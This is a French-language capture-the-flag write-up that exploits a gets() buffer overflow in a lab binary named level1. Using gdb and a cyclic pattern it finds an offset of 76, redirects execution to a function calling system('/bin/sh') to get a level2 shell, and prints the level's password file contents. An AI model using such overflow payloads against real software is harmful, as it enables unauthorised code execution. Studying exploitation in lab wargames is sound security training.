Pour voir ce qu'il y a dans le binaire nous faison un objdump sur celui celui

>> objdump -d ./level1 > dump

On voit que dans le main il y a une fonction gets qui est vulnerable au buffer 
overflow

Après quelques recherche je suis tombé sur ce site qui aide Pour
exploiter des buffers overflow:

https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

On génere une longue chaine aléatoire :

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

et on la met dans un fichier /tmp/customstr et on l'injecte via gdb :
pour voir a quel adresse on segfault pour avoir l'adresse du registre
eip

>> gdb level1
>> run < /tmp/customstr

<< Program received signal SIGSEGV, Segmentation fault.
    0x63413563 in ?? ()

On voit qu'il segfault a l'adresse 0x63413563, on copie ca sur le site
et on obtiens un offset de 76.

Il faut donc une chaine de 76 charactère pour overflow jusqu'a eip

pour ce qui est d'eip, il faut lui donner l'adresse de la prochaine
instruction a executer.

en recherchant sur internet, j'ai d'abords pensé a mettre l'adresse
juste apres celui ci, et enchainé avec un Nop sled suivi d'un shellcode
executant /bin/sh mais je me suis souvenu avoir vu une fonction run dans 
l'objdump au depart.

on l'ouvre avec gdb :

(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret

on voit a la fin qu'il y a un appel a system et juste avant on lui
donne le contenu de 0x8048584 en parametre via esp

(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"

cette fonction execute donc un appel system a /bin/sh
je decide donc d'injecter ma longue chaine de caractere pour remplir
le buffer suivi de l'adresse de cette fonction run (en respectant l'endianness)

>> python -c "print('*' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/customstr

il suffit ensuite d'injecter la chaine dans le binaire tout en gardant un
acces a stdin. pour cela je rappel un cat juste apres avoir cat mon fichier

>> (cat /tmp/customstr; cat) | ./level1
<< Good... Wait what?
>> whoami
<< level2

nous sommes maintenant level2, il ne reste plus qu'a recuperer le flag

>> cat /home/user/level2/.pass
<< 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
